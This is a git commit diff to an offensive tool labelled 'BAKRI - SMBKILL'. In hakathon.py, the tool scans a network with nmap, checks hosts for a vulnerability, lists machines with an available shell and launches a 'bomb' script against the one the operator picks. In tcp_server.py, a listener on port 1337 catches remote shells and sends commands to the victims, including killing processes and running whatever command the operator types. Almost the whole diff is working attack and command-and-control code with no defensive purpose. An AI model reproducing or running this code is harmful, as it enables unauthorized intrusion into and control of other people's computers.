e47f1fa49265ca119d09a322d3231f2dfbba0428
Shuvam Roy <Shuvam Roy>
2018-02-23 05:22:04 +0530

    Updated

--- hakathon.py
+++ hakathon.py
@@ -1,30 +1,86 @@
 import threading
 import sys
 import os
+import nmap
 import time
 
-def checker():
-    c = "python checker.py " + sys.argv[1]
-    os.system(c)
-    print ("\n")
-    
 
 def handler():
-    #time.sleep(0.05)
     os.system('python tcp_server.py')
-	
-print "SMBKILL ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-print ""
-print ""
-print "[*] Starting Services [*]\n"
 
-print "[*] Starting handler :) [*]\n"
+os.system("rm file.txt")
+os.system("rm ip.txt")
+if os.name == 'nt':
+   os.system("ipconfig | findstr IPv4 >> ip.txt ")
+else:
+   os.system("ifconfig | grep ip >> ip.txt")
+with open("ip.txt") as ip:
+      ips = ip.readlines()
+for i in ips:
+    print i
+print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ BAKRI - SMBKILL ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Realized by PSY ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+print ""
+print "[*] Starting services... [*]"
+print "[*] Starting handler :)  [*]"
 shell_handler = threading.Thread(target=handler)
 shell_handler.start()
-print "[*] Handler Started!!! [*]\n"
-print 
-print 
-time.sleep(5)
-print "\n[*] Scanning targets [*]"
-checker()
+print "[*] Handler started!!!   [*]\n"
 
+print "[*] Scanning targets...  [*]\n"
+nm = nmap.PortScanner()
+nm.scan(hosts=sys.argv[1], arguments='-n -sP')
+hosts_list = [(x, nm[x]['status']['state']) for x in nm.all_hosts()]
+
+
+found_addresses = []
+print "\nMachines found :"
+for host, status in hosts_list:
+    print(host + ' ' + status)
+    if (status == 'up'):
+        found_addresses.append(host)
+
+
+def checker(address):
+    c = "python checker.py " + address
+    os.system(c)
+    print "Scanning complete for " + address
+    print ("\n")
+
+
+def bomb(address):
+    c = "python bomb.py " + address
+    os.system(c)
+    print "Nuking complete for " + address
+    print ("\n")
+
+	# print found_addresses
+for address in found_addresses:
+    checker(address)
+
+with open('file.txt') as f:
+     vulnerable_addresses = f.readlines()
+
+i = 0
+print("Shell is available for following computers:")
+for address in vulnerable_addresses:
+    print (i, ": ", address)
+    i += 1
+
+
+#os.system('cat file.txt')
+i = int(raw_input("Press computer number to open its shell:"))
+#total = ''
+#for addr in vulnerable_addresses:
+#    total = total + addr.replace(" \n" , "") 
+
+v_address = vulnerable_addresses[i].replace(" \n","")
+print("Vadress:" + v_address)
+
+
+bomb(v_address)
+
+time.sleep(10)
+#print "[*][*]Program complete[*][*]"
+#print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ BAKRI - SMBKILL ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+#print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Realized by PSY ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
--- tcp_server.py
+++ tcp_server.py
@@ -3,51 +3,67 @@ import socket
 
 bind_ip = "0.0.0.0"
 bind_port = 1337
- 
 
-server = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
-server.bind((bind_ip , bind_port))
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind((bind_ip, bind_port))
 server.listen(1)
-print ('[*] Listening on port : ', bind_port)
+print "[*] Listening on port", bind_port, "... [*]"
 
-#client handling system
+
+# client handling system
 def handle_client(client_socket):
-  request = client_socket.recv(1024)
-  client_socket.send('\r\n')
-  request = request + client_socket.recv(1024)
-  print request
-  while request:
+    request = client_socket.recv(1024)
+    client_socket.send('\r\n')
+    request = request + client_socket.recv(1024)
+    print request
+    while request:
+        comm = raw_input("Command ->")
+        if comm == "identify":
+            client_socket.send("netstat -ano | findstr ESTAB\r\n")
+            resp = client_socket.recv(4096)
+            # print resp
+            # client_socket.send('\r\n')
+            resp = client_socket.recv(4096)
+            print resp
+            # time.sleep(3)
 
-     comm = raw_input("Command ->" )
-     comm = comm + '\r\n'
-     client_socket.send(comm)
-     client_socket.send('\r\n')
-     print "\r\n"
-     
-     request = client_socket.recv(1024)
-     #print "recv1 "
-     #print request
-     #print "result\r\n"
-     
-     client_socket.send('\r\n')
-     request = client_socket.recv(1024)
-     
-     while request:
-            	 
-           print request
-           if (raw_input("Continue? (c)") == 'c'):
-              request = client_socket.recv(1024)
-           else: 
-              break
+            pid = raw_input("PID to kill ")
+            kill = "taskkill /f /pid " + pid + '\r\n'
+            client_socket.send(kill)
+            continue
+        elif comm == "warn":
+            #client_socket.send("echo 'Set objArgs = WScript.Arguments' >> c:\pwned.vbs\r\n")
+            #client_socket.send("echo 'messageText = objArgs(0)' >> c:\pwned.vbs\r\n")
+            #client_socket.send("echo 'MsgBox messageText' >> c:\pwned.vbs\r\n")
+            client_socket.send("start '' cmd /c 'echo Greetings from P$Y&echo(&pause'")
+            continue
+    # comm = comm + '\r\n'
+        client_socket.send(comm)
+        client_socket.send('\r\n')
+    # print "\r\n"
 
-     
-     
-  client_socket.close()
+        request = client_socket.recv(4096)
+    # print "recv1 "
+    # print request
+    # print "result\r\n"
+
+    # client_socket.send('\r\n')
+
+    # request = client_socket.recv(1024)
+
+        while request:
+
+            print request
+            if (raw_input("Continue? (c)") == 'c'):
+               request = client_socket.recv(1024)
+            else:
+               break
+
+
+    client_socket.close()
 
 while True:
-  client , addr = server.accept()
-  print ("[*] Accepted Connection from "   ,  (addr[0],addr[1]))
-  client_handler = threading.Thread(target=handle_client, args=(client,))
-  client_handler.start()
-
-  
+    client, addr = server.accept()
+    print ("[*] Accepted Connection from ", (addr[0], addr[1]))
+    client_handler = threading.Thread(target=handle_client, args=(client,))
+    client_handler.start()
